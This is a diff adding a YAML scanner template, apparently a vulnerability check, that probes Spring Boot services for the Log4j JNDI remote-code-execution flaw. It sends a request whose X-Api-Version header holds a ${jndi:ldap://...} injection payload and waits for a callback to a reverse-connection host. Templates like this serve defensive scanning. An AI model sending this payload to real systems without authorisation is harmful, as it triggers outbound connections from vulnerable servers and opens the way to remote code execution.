@@ -1,0 +1,13 @@
+name: springboot-log4j-rce
+set:
+  reverse: newReverse()
+  reverseURL: reverse.domain
+rules:
+  r0:
+    request:
+      method: GET
+      path: /
+      headers:
+        X-Api-Version: ${jndi:ldap://{{reverseURL}}}
+    expression: reverse.wait(5)
+expression: r0()
